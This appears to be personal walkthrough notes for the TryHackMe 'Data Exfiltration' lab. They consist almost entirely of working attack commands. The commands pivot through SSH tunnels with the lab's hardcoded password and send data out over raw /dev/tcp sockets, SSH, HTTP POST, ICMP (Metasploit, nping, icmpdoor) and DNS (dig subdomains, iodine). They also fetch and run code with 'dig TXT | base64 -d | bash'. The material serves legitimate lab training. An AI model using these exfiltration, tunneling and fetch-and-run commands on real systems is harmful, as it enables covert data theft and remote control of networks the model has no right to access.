+++
title = "Data Exfiltration"
+++

# https://tryhackme.com/room/dataxexfilt

- Living Off Trusted Sites (LOTS) Project: https://lots-project.com/

```bash
=================================
10.201.61.209 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.61.209' >> ~/.zshrc && source ~/.zshrc
echo "$TARGET TARGET" | sudo tee -a /etc/hosts

> jump.thm.com 10.201.61.209 192.168.0.133
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 thm@$TARGET

# no ipconfig/ip addr
echo "===== IP Addresses Found ====="; awk 'NR > 1 {print $2}' /proc/net/tcp /proc/net/udp 2>/dev/null | cut -d: -f1 | sort -u | grep -E '^[0-9A-F]{8}$' | while read -r hex; do ip=$(printf "%d.%d.%d.%d" 0x${hex:6:2} 0x${hex:4:2} 0x${hex:2:2} 0x${hex:0:2}); if [[ "$ip" != "127.0.0.1" && "$ip" != "0.0.0.0" ]]; then echo "$ip"; fi; done; echo ""; echo "===== Default Gateway ====="; gateway_hex=$(awk '$2 == "00000000" {print $3}' /proc/net/route 2>/dev/null | head -1); if [ -n "$gateway_hex" ]; then printf "%d.%d.%d.%d\n" 0x${gateway_hex:6:2} 0x${gateway_hex:4:2} 0x${gateway_hex:2:2} 0x${gateway_hex:0:2}; else echo "Not found"; fi; echo ""; echo "===== Network Interfaces ====="; for iface in $(ls /sys/class/net/ 2>/dev/null); do echo "Interface: $iface"; echo "  MAC Address: $(cat /sys/class/net/$iface/address 2>/dev/null)"; echo "  State: $(cat /sys/class/net/$iface/operstate 2>/dev/null)"; done

>> victim1.thm.com 192.168.0.101
# tunnel
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 thm@$TARGET -NfL 51000:192.168.0.101:22
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 51000 thm@localhost

>> victim2.thm.com 172.20.0.101
# tunnel
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 thm@$TARGET -NfL 52000:172.20.0.101:22
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 52000 thm@localhost

>> web.thm.com 192.168.0.100
# tunnel
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 thm@$TARGET -NfL 53000:192.168.0.100:22
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 53000 thm@localhost

>> uploader.thm.com 172.20.0.100
# tunnel
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 thm@$TARGET -NfL 54000:172.20.0.100:80
#echo 'uploader.thm.com 127.0.0.1' | sudo tee -a /etc/hosts

---

### Socket Exfil
# jumpbox
nc -lvnp 8888 > task4.magic
# victim1
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8888
# jumpbox
dd conv=ascii if=task4.magic | base64 -d | tar xzf -

### SSH Exfil
# victim2 => jumpbox
tar cf - task5/ | ssh thm@172.20.0.2 "cd /tmp/; tar xpf -"

### HTTP Exfil
# - POST requests... are never cached
# 		- do not remain in the browser history
# 		- cannot be bookmarked
# 		- have no restrictions on data length

# jumpbox
echo '<?php 
if (isset($_POST["contact"])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST["file"]);
        fclose($file);
   }
?>' > contact.php
# victim
curl --data "contact=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
# jumpbox: fix url encoding
sed 's/ /+/g' /tmp/http.bs64 | base64 -d | tar xvfz -

# Encrypted web tunneling
# https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md

python3 -m venv regeorg
source regeorg/bin/activate
python -m pip install requests requests[socks] curl-cffi requests_ntlm
git clone https://github.com/L-codes/Neo-reGeorg.git ; cd Neo-reGeorg

python3 neoreg.py generate -k thm
# http://10.201.61.209/uploader
# https://10.201.61.209.reverse-proxy-us-east-1.tryhackme.com/uploader

sudo python3 neoreg.py -k thm -u https://10.201.61.209.reverse-proxy-us-east-1.tryhackme.com/uploader/files/tunnel.php -vv

curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag

---
### ICMP Exfil

sudo nohup sshuttle -r thm@$TARGET --ssh-cmd "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" -x 10.13.95.101 -v 192.168.0.0/24 172.20.0.0/24 2>&1 >/dev/null &
// tryhackme

sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 thm@192.168.0.121

// ---

sudo msfconsole -q
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src 10.13.95.101
set interface tun0
run

# Exfil: icmp.thm.com => ATTACKER
sudo nping --icmp -c 1 10.13.95.101 --data-string "BOFfile.txt"
sudo nping --icmp -c 1 10.13.95.101 --data-string "admin:password"
sudo nping --icmp -c 1 10.13.95.101 --data-string "admin2:password2"
sudo nping --icmp -c 1 10.13.95.101 --data-string "EOF"

// ---
### ICMPdoor Protocol Exfil
# https://github.com/krabelize/icmpdoor
reset ; sudo tcpdump -i tun0 icmp

# icmp.thm.com
sudo icmpdoor -i eth0 --destination_ip 192.168.0.133

# jumpbox.thm.com
sudo icmp-cnc -i eth1 --destination_ip 192.168.0.121
// opens channel
hostname

---
### DNS Exfil

https://10-201-61-209.reverse-proxy-us-east-1.tryhackme.com/

# attacker
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2322 thm@10.201.61.209

sudo tcpdump -i eth0 udp port 53 -v  

# victim2
sshpass -p 'tryhackme' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2122 thm@10.201.61.209

// NOTE: subdomains cant be longer than 63 (255 total for FQDN)
cat task9/credit.txt | base64 | tr -d "\n"| fold -w60 | sed -r 's/.*/&.att.tunnel.com/' 

export LENGTH=18; cat task9/credit.txt |base64 | tr -d "\n" | fold -w$LENGTH | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash

# get flag
dig +short -t TXT flag.tunnel.com | tr -d '"' | base64 -d | bash

---
### DNS Tunneling via iodine
# https://github.com/yarrick/iodine

# attacker
sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com

# jumpbox
sudo iodine -P thmpass att.tunnel.com

# attacker
ssh thm@10.1.1.2 -4 -f -N -D 1080
// tryhackme

proxychains curl -o- http://192.168.0.100/test.php
// winner
```